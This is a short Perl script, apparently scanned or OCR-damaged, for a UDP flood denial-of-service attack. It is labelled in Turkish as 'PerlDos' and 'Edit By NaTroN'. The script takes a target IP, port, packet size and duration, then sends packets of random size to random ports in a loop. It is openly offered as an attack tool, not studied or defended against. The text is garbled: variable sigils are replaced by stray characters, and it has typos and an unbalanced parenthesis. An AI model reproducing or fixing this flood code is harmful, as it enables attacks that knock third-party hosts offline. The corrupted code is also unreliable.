* ! /usr/bin/perl
**
* ! /usr/bin/perl
use Socket ;
use striot ;
my (Þip,Sport,Þsize,Þtime) =@ARGV;
my (Þiaddr,Sendtime,Spsize,Spport) ;
Þiaddr=inet_aton ("Þip") or die "perl NaTPV2.pl Ip Port [Edit By NaTroN*] Þip/n";
Þendtime=time () + (Þtime ? Þtime : 100) ;
socket (flood,PF_INET,SOCK_DGRAM, 17) ;


print
<<EOTEXT;
EOTEXT

print"~Saldiri Basladi Edit : MBE Software - PerlDos* : Þip". (Sport?Sport:"random") ."SALDIRI GUCU ".
 (Þsize?"Þsize-Gbit" : "SmackedWith A Large Packets?") ."".
 (Þtime ?  "for Þtime Saniye " : "") ."/n";
for  (; time () <=Þendtime;) {
Spsize =Þsize ? Þsize : int (rand(1024-64) +64;
Spport -Sport ? Sport : int(rand(65500) ) +1;

send (flood,pack ("aÞpsize","flood") ,O,pack_sockaddr_in (Þpport,Þiaddr) ):)